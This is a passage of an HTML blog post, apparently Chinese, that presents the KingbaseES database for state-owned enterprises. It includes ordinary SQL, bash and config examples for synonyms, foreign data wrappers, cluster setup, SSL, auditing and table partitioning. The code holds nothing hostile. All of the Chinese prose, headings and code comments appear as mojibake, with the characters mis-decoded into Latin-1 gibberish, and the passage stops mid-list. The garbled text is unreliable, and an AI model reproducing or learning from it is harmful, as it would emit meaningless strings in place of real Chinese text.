<p>è®ºåŠå¤®ä¼å›½ä¼çš„æ•°å­—åŒ–è½¬å‹æ—¶ï¼Œæ•°æ®åº“ä¾¿æ˜¯é‚£å—çŠ¹å¦‚å®šæµ·ç¥é’ˆä¸€èˆ¬çš„â€œå‹èˆ±çŸ³â€ï¼Œå…¶è¦æ±‚ååˆ†ç®€å•ï¼Œå³ç¨³å›ºï¼Œå®‰å…¨ä¸”å¯è¢«æ§åˆ¶ï¼Œç»ä¸èƒ½å‡ºç°åŠç‚¹å·®é”™ã€‚é‡‘ä»“æ•°æ®åº“ï¼ˆKingbaseESï¼Œåˆç§°KESï¼‰å±äºæ•°æ®åº“é¢†åŸŸçš„â€œå›½å®¶é˜Ÿâ€ï¼Œå…¶æ—©å·²éæ–°æ‰‹ï¼Œå·²åœ¨èƒ½æºï¼Œç”µåŠ›ï¼Œé‡‘èï¼Œäº¤é€šç­‰å…³é”®è¡Œä¸šæ‰æ ¹ï¼Œå§‹ç»ˆæ”¯æ’‘ç€æ ¸å¿ƒä¸šåŠ¡çš„ç¨³å®šè¿è¡Œï¼ŒåŠ©åŠ›å›½äº§åŒ–è¿›ç¨‹ç¨³æ­¥å‰è¡Œï¼Œæ­¤ç¯‡æ–‡ç« ä¸è¿‡åˆ†è™šå¤¸ï¼Œä»…å‡­å®˜æ–¹èµ„æ–™ä¸å…¬å¼€æ¡ˆä¾‹é˜è¿°ï¼ŒæŠŠKESçš„æŠ€æœ¯ä¼˜åŠ¿æ‰€åœ¨ï¼ŒåŠå…¶åœ¨å¤®å›½ä¼å¦‚ä½•è½å®å¼€æ¥æ¸…æ¥šé“ç ´ï¼Œè€Œä¸”è¿˜ä¼šé™„ä¸Šå¯ä»¥ç›´æ¥æ‰§è¡Œçš„ä»£ç ï¼Œè®©ä½ æ—¢èƒ½çœ‹æ‡‚ï¼Œåˆèƒ½åŠ¨æ‰‹å°è¯•ã€‚
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9b837c819f9f4d348473c1f68d011908~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764591898&amp;x-signature=xKwZ29jGvsAGf57Sf2Lwt15FqAU%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">é‡‘ä»“æ•°æ®åº“çš„ä»‹ç»</h2>
<ul>
<li>
<p>äº§å“å®šä½ä¸æ¶æ„ç‰¹å¾</p>
<ul>
<li>
<p>KES çš„å®šä½å¾ˆæ¸…æ¥šï¼Œå°±æ˜¯å†²ç€å„è¡Œå„ä¸šçš„è¦å®³åº”ç”¨å»çš„ã€‚å®ƒæ˜¯ä¸ªä¼ä¸šçº§çš„å¤§å‹é€šç”¨èåˆæ•°æ®åº“ï¼Œè¯´ç™½äº†å°±æ˜¯ä¸ªâ€œå¤šé¢æ‰‹â€ï¼šæ—¢èƒ½å¤„ç†æ—¥å¸¸äº¤æ˜“ï¼ˆOLTPï¼‰ï¼Œä¹Ÿèƒ½æå®šæ•°æ®åˆ†æï¼ˆOLAPï¼‰ï¼Œè¿˜èƒ½è½»æ¾æ‹¿ææµ·é‡çš„æ—¶åºæ•°æ®ã€å…¨æ–‡æœç´¢ã€åœ°ç†ä¿¡æ¯ï¼ˆGISï¼‰è¿™äº›å¤æ‚æ´»å„¿ã€‚
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1002b4da74f9474fb56460b7f4bd3c3f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764591898&amp;x-signature=6zrCx1oFKSA1DriSqJVFUEvtTOY%3D" alt="image.png" loading="lazy"/></p>
</li>
<li>
<p>èåˆæ•°æ®åº“æ¶æ„ï¼šæœ€å‰å®³çš„æ˜¯å®ƒçš„â€œèåˆâ€æ¶æ„ï¼šä¸€å¥—è½¯ä»¶ï¼Œå°±èƒ½åŒæ—¶å…¼å®¹ Oracleã€MySQLã€SQL Serverã€PostgreSQL å¥½å‡ ç§ä¸»æµè¯­æ³•ï¼Œå¼€å‘è¿ç§»éƒ½çœå¿ƒã€‚æ•°æ®æ¨¡å‹ä¸Šï¼Œä¸ç®¡æ˜¯ä¼ ç»Ÿçš„å…³ç³»å‹æ•°æ®ï¼Œè¿˜æ˜¯æ—¶é«¦çš„æ–‡æ¡£/JSONã€å…¨æ–‡ã€GISã€æ—¶åºæ•°æ®ï¼Œå®ƒéƒ½èƒ½è£…å¾—ä¸‹ã€‚éƒ¨ç½²çš„æ—¶å€™ï¼Œä½ å¯ä»¥æ ¹æ®ä¸šåŠ¡å¯¹å¯ç”¨æ€§å’Œæˆæœ¬çš„è¦æ±‚ï¼Œè‡ªç”±é€‰æ‹©é›†ä¸­å¼æˆ–è€…åˆ†å¸ƒå¼ï¼Œéå¸¸çµæ´»ã€‚
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9474d6ed7b747cdae4d046d5eec77c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764591898&amp;x-signature=ObdpJzNjBHAOj37DVUU9hoIg%2BHo%3D" alt="image.png" loading="lazy"/></p>
</li>
</ul>
</li>
<li>
<p>ç”Ÿæ€ä¸å·¥å…·é“¾</p>
<ul>
<li>å·¥å…·é“¾è¦†ç›–è¯„ä¼°ã€è¿ç§»ã€å¼€å‘ã€è¿ç»´å…¨æµç¨‹ï¼šé‡‘ä»“æä¾›äº†ä¸€æ•´å¥—å·¥å…·ï¼ŒæŠŠè¯„ä¼°ã€è¿ç§»ã€å¼€å‘ã€è¿ç»´è¿™äº›æ´»å„¿å…¨åŒ…äº†ã€‚ç”¨ KDMS/KDTS æå®šè¯„ä¼°å’Œè¿ç§»ï¼Œç”¨ KStudio ç®¡ç†å¼€å‘å’Œæ•°æ®åº“å¯¹è±¡ï¼Œå†ç”¨ KOPS/KEMCC åšé›†ä¸­çš„ç›‘æ§å’Œè¿ç»´ã€‚å¯ä»¥è¯´ï¼Œä»â€œèƒ½ä¸èƒ½è¿è¿‡æ¥â€åˆ°â€œç”¨å¾—çˆ½ä¸çˆ½â€ï¼Œæ•´ä¸ªç”Ÿå‘½å‘¨æœŸå®ƒéƒ½å¸®ä½ å®‰æ’å¾—æ˜æ˜ç™½ç™½ã€‚
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45898bdf8c9946d1a08081b36302aa78~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764591898&amp;x-signature=Gbk2sTcXyqYH4UWd%2B22owYASj7E%3D" alt="image.png" loading="lazy"/></li>
</ul>
</li>
<li>
<p>å®‰å…¨ä¸åˆè§„èƒ½åŠ›</p>
<ul>
<li>ä¸‰æƒåˆ†ç«‹ï¼šè¿™ä¸ªæœºåˆ¶å¾ˆå…³é”®ï¼Œå®ƒæŠŠæ•°æ®åº“ç®¡ç†å‘˜ã€å®‰å…¨ç®¡ç†å‘˜ï¼ˆssoï¼‰ã€å®¡è®¡ç®¡ç†å‘˜ï¼ˆsaoï¼‰çš„æƒé™å½»åº•åˆ†å¼€ï¼Œè°ä¹Ÿç®¡ä¸äº†è°ï¼Œè¿™æ ·å°±é¿å…äº†â€œè¶…çº§ç®¡ç†å‘˜â€ä¸€ä¸ªäººè¯´äº†ç®—çš„æƒ…å†µï¼Œå®‰å…¨æ€§å¤§å¤§æé«˜ã€‚è€Œä¸”ï¼Œå®ƒè¿˜æ”¯æŒå—é™çš„ DBA æ’ä»¶å¼ç®¡ç†ï¼Œæƒé™æ§åˆ¶å¾—æ›´ç»†ã€‚</li>
<li>ä¼ è¾“åŠ å¯†ï¼šæ•°æ®åœ¨ç½‘ç»œä¸Šä¼ è¾“çš„æ—¶å€™ï¼ŒKES åŸç”Ÿå°±æ”¯æŒ SSL/TLS åŠ å¯†ã€‚ä½ åªè¦é…å¥½è¯ä¹¦å’ŒåŠ å¯†ç®—æ³•ï¼Œå°±èƒ½ä¿è¯æ•°æ®åœ¨è·¯ä¸Šä¸è¢«å·çœ‹æˆ–ç¯¡æ”¹ï¼Œé“¾è·¯å®‰å…¨å¾—å¾ˆã€‚</li>
<li>å®¡è®¡èƒ½åŠ›ï¼šè°åŠ¨äº†æˆ‘çš„æ•°æ®ï¼ŸKES çš„ sysaudit æ’ä»¶èƒ½æŠŠæœåŠ¡å™¨ä¸Šå‘ç”Ÿçš„å„ç§äº‹ä»¶ã€æ‰§è¡Œçš„ SQL è¯­å¥ã€æ“ä½œçš„å¯¹è±¡éƒ½è®°ä¸‹æ¥ã€‚å®¡è®¡çš„å¼€å…³å’Œç­–ç•¥å®Œå…¨ç”±ä½ æ§åˆ¶ï¼Œæƒ³æŸ¥ä»€ä¹ˆå°±æŸ¥ä»€ä¹ˆã€‚</li>
<li>å¼ºåˆ¶è®¿é—®æ§åˆ¶ï¼ˆMACï¼‰ï¼šå¯¹äºä¿å¯†è¦æ±‚æé«˜çš„åœºæ™¯ï¼ŒKES è¿˜æœ‰å¤§æ‹›â€”â€”å¼ºåˆ¶è®¿é—®æ§åˆ¶ã€‚é€šè¿‡ç»™æ•°æ®æ‰“ä¸Šä¸åŒçš„å®‰å…¨æ ‡ç­¾ï¼Œå¯ä»¥å®ç°å¯¹è±¡çº§ã€åˆ—çº§ç”šè‡³è¡Œçº§çš„è®¿é—®æ§åˆ¶ã€‚è¿™å¾—åŠ è½½ sysmac æ’ä»¶æ‰èƒ½ç”¨ï¼Œä½†æ•ˆæœç»å¯¹ç¡¬æ ¸ã€‚</li>
</ul>
</li>
<li>
<p>å¯ç”¨æ€§ä¸é›†ç¾¤</p>
<ul>
<li>é«˜å¯ç”¨è¿™å—ï¼Œé‡‘ä»“çš„æ–¹æ¡ˆå¾ˆå…¨ã€‚ä»åŸºæœ¬çš„ä¸»å¤‡ã€è¯»å†™åˆ†ç¦»ï¼Œåˆ°è¦æ±‚æ›´é«˜çš„åŒåŸåŒæ´»ã€ä¸¤åœ°ä¸‰ä¸­å¿ƒï¼Œå†åˆ°èƒ½è·¨èŠ‚ç‚¹è¯»å†™å’Œæ‰©å±•çš„ RAC å…±äº«å­˜å‚¨é›†ç¾¤ï¼Œå„ç§æ¶æ„éƒ½èƒ½æ­ã€‚æ€»ä¹‹ä¸€å¥è¯ï¼Œæ—¢ä¿è¯äº†ä¸šåŠ¡è¿ç»­æ€§ï¼Œåˆèƒ½æŒ‰éœ€æ‰©å±•ã€‚</li>
</ul>
</li>
<li>
<p>å¸‚åœºåº”ç”¨ä¸è£…æœºè§„æ¨¡</p>
<ul>
<li>å®˜æ–¹è‡ªå·±å…¬å¸ƒçš„æ•°æ®æ˜¯ï¼šKES å·²ç»ç»™èƒ½æºã€é‡‘èã€ç”µä¿¡ã€äº¤é€šã€åŒ»ç–—ã€æ”¿åŠ¡ç­‰ 30 å¤šä¸ªè¡Œä¸šæä¾›äº†æœåŠ¡ï¼Œè£…æœºé‡ç´¯è®¡è¶…è¿‡äº† 100 ä¸‡å¥—ã€‚è€Œä¸”ï¼Œåœ¨å›½äº§æ•°æ®åº“çš„å…³é”®åº”ç”¨é¢†åŸŸï¼Œå®ƒçš„é”€å”®å¥—æ•°å·²ç»è¿ç»­å››å¹´æ’ç¬¬ä¸€äº†ã€‚</li>
</ul>
</li>
</ul>
<h2 data-id="heading-2">é‡‘ä»“æ•°æ®åº“åœ¨å¤®ä¼å›½ä¼åº”ç”¨çš„æŠ€æœ¯è§£è¯»</h2>
<p>å¯¹äºå¤®ä¼å’Œå›½ä¼æ¥è¯´ï¼Œé€‰æ•°æ®åº“ï¼Œå…‰â€œèƒ½ç”¨â€æ˜¯è¿œè¿œä¸å¤Ÿçš„ï¼Œå…³é”®å¾—â€œç”¨å¾—å¥½â€ã€‚ä»€ä¹ˆå«ç”¨å¾—å¥½ï¼Ÿå¹³æ»‘æ›¿æ¢å¾—çœå¿ƒï¼Œç³»ç»Ÿæ¶æ„å¾—èƒ½æ‰›äº‹å„¿ï¼Œå®‰å…¨é˜²æŠ¤å¾—æ²¡æ¼æ´ï¼Œæ•°æ®ç”¨èµ·æ¥å¾—é¡ºæ‰‹ï¼Œè¿ç§»å’Œè¿ç»´è¿˜å¾—çœåŠ›æ°”ã€‚ä¸‹é¢ï¼Œå’±ä»¬å°±ç»“åˆé‡‘ä»“å®˜æ–¹ç»™å‡ºçš„èƒ½åŠ›å’Œä¸€äº›å…¸å‹åœºæ™¯ï¼ŒæŠŠè¿™äº›å…³é”®ç‚¹æ°å¼€æ‰ç¢äº†è®²ï¼Œå¹¶ä¸”é…ä¸Šä»£ç ä¾‹å­ï¼Œæ–¹ä¾¿ä½ å®é™…æ“ä½œã€‚</p>
<h3 data-id="heading-3">1. å¹³æ»‘æ›¿ä»£ä¸ç”Ÿæ€å…¼å®¹</h3>
<p>-KES å…¼å®¹ Oracleï¼ŒMySQLï¼ŒSQL Serverï¼ŒPostgreSQL çš„è¯­æ³•ä¸æ¥å£ï¼Œè¿™åœ¨å›½äº§åŒ–æ›¿ä»£è¿›ç¨‹ä¸­å ªç§°ç¦éŸ³ï¼Œå…¶ä¼˜åŠ¿ååˆ†æ˜æ˜¾ï¼Œå³ä¸šåŠ¡ä»£ç æ— éœ€å¤§å¹…æ”¹åŠ¨æˆ–è€…æ— éœ€æ”¹åŠ¨ï¼Œå¦‚æ­¤ä¸€æ¥ï¼Œæ—¢èƒ½æå¤§å‹ç¼©é¡¹ç›®å†æ—¶ï¼Œåˆèƒ½æŠŠè¿ç§»é£é™©é™è‡³è¾ƒä½æ°´å¹³ã€‚</p>
<p>å…¸å‹çš„å…¼å®¹ä¾‹å­å°±æ˜¯Oracleä¸­å¸¸è¢«ç”¨åˆ°çš„åŒä¹‰è¯ï¼ˆSynonymï¼‰ï¼ŒKESä¹Ÿæ˜¯æ”¯æŒå®ƒçš„ï¼Œè¿ç§»è¿‡æ¥ä»¥åï¼Œå¯ä»¥åˆ©ç”¨å®ƒç»™è¡¨èµ·åˆ«åï¼Œè¿™æ ·ä¹‹å‰çš„ç¨‹åºä»£ç å°±æ— éœ€åšä¿®æ”¹ï¼Œå¯ä»¥ç›´æ¥è¢«è®¿é—®ï¼Œååˆ†ä¾¿æ·ã€‚</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- åœ¨å½“å‰æ¨¡å¼åˆ›å»ºåŒä¹‰è¯ï¼ŒæŒ‡å‘ç›®æ ‡å¯¹è±¡</span>
<span class="hljs-keyword">CREATE</span> SYNONYM emp <span class="hljs-keyword">FOR</span> hr.employees;

<span class="hljs-comment">-- ä¹Ÿæ”¯æŒæŒ‡å®šç”¨æˆ·æ¨¡å¼åˆ›å»º</span>
<span class="hljs-keyword">CREATE</span> SYNONYM hr_emp <span class="hljs-keyword">FOR</span> hr.employees;
</code></pre>
<ul>
<li>å¤–éƒ¨æœåŠ¡ä¸ FDWï¼ˆç¤ºä¾‹ï¼‰ï¼šæœ‰æ—¶å€™éœ€è¦è®¿é—®å…¶ä»–æ•°æ®åº“çš„æ•°æ®ï¼ŒKES çš„å¤–éƒ¨æ•°æ®åŒ…è£…å™¨ï¼ˆFDWï¼‰å°±èƒ½æ´¾ä¸Šç”¨åœºã€‚é€šè¿‡å®ƒï¼Œä½ å¯ä»¥ç›´æ¥åœ¨ KES é‡ŒæŸ¥è¯¢å¦ä¸€ä¸ªæ•°æ®åº“çš„è¡¨ï¼Œå°±åƒæ“ä½œæœ¬åœ°è¡¨ä¸€æ ·ã€‚ï¼ˆä¸‹é¢çš„è¯­æ³•åªæ˜¯ä¸ªä¾‹å­ï¼Œå…·ä½“ç”¨çš„æ—¶å€™å¾—æ ¹æ®ä½ çš„æ•°æ®åº“ç‰ˆæœ¬å’Œé©±åŠ¨æ¥è°ƒæ•´ï¼‰ã€‚</li>
</ul>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> SERVER myserver <span class="hljs-keyword">FOREIGN</span> DATA WRAPPER kingbase_fdw
  OPTIONS (host <span class="hljs-string">'db.internal'</span>, dbname <span class="hljs-string">'legacydb'</span>, port <span class="hljs-string">'54321'</span>);
</code></pre>
<h3 data-id="heading-4">2. é«˜å¯ç”¨æ¶æ„ä¸æ•…éšœåº”å¯¹</h3>
<p>KES æ‰€æ”¯æŒçš„æ¶æ„ååˆ†å…¨é¢ï¼Œè¯»å†™åˆ†ç¦»ï¼ŒåŒåŸåŒæ´»ï¼Œä¸¤åœ°ä¸‰ä¸­å¿ƒï¼ŒRAC å…±äº«å­˜å‚¨ç­‰æ–¹æ¡ˆï¼Œéƒ½å¯ä»¥å¸®åŠ©è¾¾æˆä¸åŒçš„æ¢å¤ç‚¹ç›®æ ‡ï¼ˆRPOï¼‰ä¸æ¢å¤æ—¶é—´ç›®æ ‡ï¼ˆRTOï¼‰ï¼Œä»è€Œä¿è¯ä¸šåŠ¡åšåˆ°ä¸€å¤© 24 å°æ—¶ï¼Œä¸€å‘¨ 7 å¤©ä¸åœæ­‡è¿è¡Œã€‚</p>
<p>åœ¨é›†ç¾¤ç¯å¢ƒä¸‹ï¼Œç½‘ç»œæ³¢åŠ¨æ—¶ï¼Œå„èŠ‚ç‚¹å‡ä¼šè‡ªè®¤ä¸ºä¸»èŠ‚ç‚¹ï¼Œæ­¤ç°è±¡è¢«ç§°ä¸ºâ€œè„‘è£‚â€ï¼ŒKESç»ç”±å®ˆæŠ¤è¿›ç¨‹ï¼ˆrepmgrd/kbhaï¼‰åŠä¿¡ä»»ç½‘å…³è®¾ç½®ï¼Œå¯è§„é¿æ­¤ç±»æƒ…å½¢ï¼Œä¿éšœé›†ç¾¤ç¨³å®šã€‚</p>
<p>éƒ¨ç½²è„šæœ¬ç¤ºä¾‹ï¼ˆå‘½ä»¤è¡Œéƒ¨ç½²ï¼Œéµç…§ç°åœºè·¯å¾„ä¸ç‰ˆæœ¬é€‚é…ï¼‰ï¼Œä¸‹é¢ç»™å‡ºåœ¨å‘½ä»¤è¡Œå½“ä¸­éƒ¨ç½²é›†ç¾¤çš„ç®€å•ç¤ºä¾‹ï¼Œå®é™…æ‰§è¡Œçš„æ—¶å€™ï¼Œè¦æŒ‰ç…§æœåŠ¡å™¨ä¸Šçš„å…·ä½“è·¯å¾„ä»¥åŠ KES çš„ç‰ˆæœ¬åšç›¸åº”çš„è°ƒæ•´ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç¼–è¾‘å®‰è£…é…ç½®</span>
vi /opt/Kingbase/ES/V9/Server/bin/install.conf

<span class="hljs-comment"># åˆå§‹åŒ–å¹¶å¯åŠ¨å®‰å…¨ç»„ä»¶ï¼ˆç¤ºä¾‹è·¯å¾„å› ç‰ˆæœ¬è€Œå¼‚ï¼‰</span>
/opt/Kingbase/ES/V9/Server/bin/sys_HAscmdd.sh init
/opt/Kingbase/ES/V9/Server/bin/sys_HAscmdd.sh start

<span class="hljs-comment"># æ‰§è¡Œé›†ç¾¤éƒ¨ç½²ï¼ˆåŒç›®å½•ä¸‹ cluster_install.shã€trust_cluster.sh ç­‰æ–‡ä»¶å‡†å¤‡é½å…¨ï¼‰</span>
sh /opt/Kingbase/ES/V9/Server/bin/cluster_install.sh
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be214edb9b624d0e89b801d4f151ee68~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764591898&amp;x-signature=0EfFbCiyNOgqCMG3zSMxgisHws0%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-5">3. å…¨é“¾è·¯å®‰å…¨ï¼šä¸‰æƒåˆ†ç«‹ã€SSLã€å®¡è®¡ã€MAC</h3>
<ul>
<li>
<p>ç®¡ç†åˆ†æƒï¼ˆä¸‰æƒåˆ†ç«‹ï¼‰ï¼šæ•°æ®åº“ä¸€åˆå§‹åŒ–ï¼Œå°±ä¼šè‡ªåŠ¨åˆ›å»º<code>ç®¡ç†å‘˜ï¼ˆsystemï¼‰</code>ã€<code>å®‰å…¨ç®¡ç†å‘˜ï¼ˆssoï¼‰</code>å’Œ<code>å®¡è®¡ç®¡ç†å‘˜ï¼ˆsaoï¼‰</code>è¿™ä¸‰ä¸ªè§’è‰²ã€‚ä»–ä»¬ä»¨å„ç®¡ä¸€æ‘Šï¼Œæƒé™è¾¹ç•Œæ¸…æ¸…æ¥šæ¥šï¼Œè°ä¹Ÿè¶Šä¸äº†ç•Œã€‚</p>
</li>
<li>
<p>ä¼ è¾“åŠ å¯†ï¼ˆSSLï¼‰é…ç½®ç¤ºä¾‹ï¼š</p>
</li>
</ul>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># kingbase.conf</span>
<span class="hljs-attr">ssl</span> = <span class="hljs-literal">on</span>
<span class="hljs-attr">ssl_cert_file</span> = <span class="hljs-string">'server.crt'</span>
<span class="hljs-attr">ssl_key_file</span>  = <span class="hljs-string">'server.key'</span>
<span class="hljs-attr">ssl_ca_file</span>   = <span class="hljs-string">'rootCA.crt'</span>
<span class="hljs-attr">ssl_ciphers</span>   = <span class="hljs-string">'HIGH:!aNULL:!MD5'</span>  <span class="hljs-comment"># ç¤ºä¾‹å¯†ç å¥—ä»¶ï¼ŒæŒ‰å®‰å…¨ç­–ç•¥æ”¶æ•›</span>

<span class="hljs-comment"># sys_hba.confï¼ˆå¼ºåˆ¶è¯ä¹¦è®¤è¯ï¼‰</span>
<span class="hljs-comment"># ä»…ç¤ºä¾‹ï¼šæ ¹æ®å®é™…ç½‘æ®µä¸è§’è‰²æ”¶æ•›</span>
hostssl all all 10.0.0.0/16 cert <span class="hljs-attr">clientcert</span>=<span class="hljs-number">1</span>
</code></pre>
<ul>
<li>å®¡è®¡å¼€å…³ä¸é‡è½½ï¼ˆsysaudit æ’ä»¶ï¼‰ï¼šæƒ³ç”¨å®¡è®¡åŠŸèƒ½ï¼Œå¾—å…ˆåœ¨é…ç½®æ–‡ä»¶é‡ŒæŠŠ <code>sysaudit</code> è¿™ä¸ªæ’ä»¶åŠ è½½ä¸Šã€‚ç­‰æ•°æ®åº“å¯åŠ¨åï¼Œä½ å°±å¯ä»¥éšæ—¶é€šè¿‡å‘½ä»¤æ‰“å¼€å®¡è®¡åŠŸèƒ½ï¼Œç„¶åé‡æ–°åŠ è½½ä¸€ä¸‹é…ç½®ï¼Œå®ƒå°±ç«‹é©¬ç”Ÿæ•ˆäº†ã€‚</li>
</ul>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- åŠ è½½å®¡è®¡æ’ä»¶ï¼ˆå¯åŠ¨å‰é…ç½®ï¼‰</span>
<span class="hljs-comment">-- kingbase.conf: shared_preload_libraries = 'sysaudit'</span>

<span class="hljs-comment">-- å¯åŠ¨åæ‰“å¼€å®¡è®¡å¹¶é‡è½½é…ç½®</span>
<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-keyword">SET</span> sysaudit.enable <span class="hljs-operator">=</span> <span class="hljs-keyword">on</span>;
<span class="hljs-keyword">CALL</span> sys_reload_conf();
</code></pre>
<ul>
<li>å¼ºåˆ¶è®¿é—®æ§åˆ¶ï¼ˆMACï¼‰ï¼šè¿™æ˜¯ä¸€ç§æ›´é«˜çº§çš„å®‰å…¨ç©æ³•ï¼Œèƒ½ç»™å¯¹è±¡ã€åˆ—ã€ç”šè‡³æ˜¯è¡Œéƒ½æ‰“ä¸Šå®‰å…¨æ ‡ç­¾ï¼Œä¸¥æ ¼éµå¾ªâ€œå‘ä¸‹è¯»ã€åŒºé—´å†™â€çš„ä¿å¯†æ¨¡å‹ã€‚ä¸è¿‡ï¼Œè¿™éœ€è¦åŠ è½½ <code>sysmac</code> æ’ä»¶ï¼Œå¹¶ä¸”å…·ä½“çš„ç­–ç•¥å’Œè¯­æ³•å¾—æŸ¥é˜…å¯¹åº”ç‰ˆæœ¬çš„å®˜æ–¹æ–‡æ¡£æ¥é…ç½®ã€‚<a href="https://link.juejin.cn?target=https%3A%2F%2Fbbs.kingbase.com.cn%2Fkingbase-doc%2Fv8.6.8.14%2Fsafety%2Fsafety-guide%2Flabel-and-mac.html" target="_blank" title="https://bbs.kingbase.com.cn/kingbase-doc/v8.6.8.14/safety/safety-guide/label-and-mac.html" ref="nofollow noopener noreferrer">å‚è€ƒ</a></li>
</ul>
<h3 data-id="heading-6">4. å¤šæ¨¡ä¸æ€§èƒ½ï¼šåˆ†åŒºã€JSONã€æ‰§è¡Œè®¡åˆ’ä¼˜åŒ–</h3>
<ul>
<li>åˆ†åŒºè¡¨ï¼ˆæ—¶é—´åˆ†åŒºç¤ºä¾‹ï¼‰ï¼šå½“ä¸€å¼ è¡¨çš„æ•°æ®é‡å˜å¾—ç‰¹åˆ«å¤§æ—¶ï¼Œå¯ä»¥æŒ‰æ—¶é—´èŒƒå›´æŠŠè¡¨â€œåˆ‡â€æˆä¸€å°å—ä¸€å°å—çš„ï¼Œè¿™å°±æ˜¯åˆ†åŒºã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œæ—¢èƒ½å‡è½»å•ä¸ªè¡¨çš„è®¿é—®å‹åŠ›ï¼Œä¹Ÿæ–¹ä¾¿ä»¥åæŒ‰æœˆæˆ–æŒ‰å¹´å¯¹è€æ•°æ®è¿›è¡Œæ¸…ç†æˆ–å½’æ¡£ã€‚</li>
</ul>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> meter_readings (
  reading_id   BIGSERIAL <span class="hljs-keyword">PRIMARY</span> KEY,
  device_id    <span class="hljs-type">BIGINT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  reading_ts   <span class="hljs-type">TIMESTAMP</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  <span class="hljs-keyword">value</span>        <span class="hljs-type">NUMERIC</span>(<span class="hljs-number">18</span>,<span class="hljs-number">6</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>
)
<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">RANGE</span> (reading_ts);

<span class="hljs-comment">-- æŒ‰æœˆåˆ›å»ºåˆ†åŒºï¼ˆç¤ºä¾‹ï¼‰</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> meter_readings_2025_11
  <span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">OF</span> meter_readings <span class="hljs-keyword">FOR</span> <span class="hljs-keyword">VALUES</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-string">'2025-11-01'</span>) <span class="hljs-keyword">TO</span> (<span class="hljs-string">'2025-12-01'</span>);

<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> meter_readings_2025_12
  <span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">OF</span> meter_readings <span class="hljs-keyword">FOR</span> <span class="hljs-keyword">VALUES</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-string">'2025-12-01'</span>) <span class="hljs-keyword">TO</span> (<span class="hljs-string">'2026-01-01'</span>);
</code></pre>
<ul>
<li>åˆ†åŒºæ‰§è¡Œè®¡åˆ’ä¼˜åŒ–ï¼šå¦‚æœä½ çš„åˆ†åŒºè¡¨æœ‰æˆç™¾ä¸Šåƒä¸ªå­åˆ†åŒºï¼ŒæŸ¥è¯¢çš„æ—¶å€™æ•°æ®åº“å…‰ç”Ÿæˆæ‰§è¡Œè®¡åˆ’å°±å¾—èŠ±ä¸å°‘æ—¶é—´ã€‚é€šè¿‡è®¾ç½® <code>partition_table_limit</code> è¿™ä¸ªå‚æ•°ï¼Œä½ å¯ä»¥å‘Šè¯‰æ•°æ®åº“ï¼šå½“ç»è¿‡ç­›é€‰åçš„å­åˆ†åŒºæ•°é‡è¶…è¿‡è¿™ä¸ªå€¼æ—¶ï¼Œå°±åˆ«å†ä¸€ä¸ªä¸ªç²¾æ‰“ç»†ç®—äº†ï¼Œç›´æ¥ç”¨ä¸€ç§å¿«é€Ÿæ¨¡å¼æ¥ç”Ÿæˆè®¡åˆ’ï¼Œè¿™æ ·èƒ½å¤§å¤§æé«˜é«˜å¹¶å‘ä¸‹çš„æŸ¥è¯¢æ€§èƒ½ã€‚</li>
</ul>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- å½“å‰ªæåçš„å­åˆ†åŒºæ•°è¶…è¿‡è¯¥é˜ˆå€¼ï¼Œå¯ç”¨å¿«é€Ÿè®¡åˆ’ç”Ÿæˆ</span>
<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-keyword">SET</span> partition_table_limit <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;
<span class="hljs-keyword">CALL</span> sys_reload_conf();
</code></pre>
<ul>
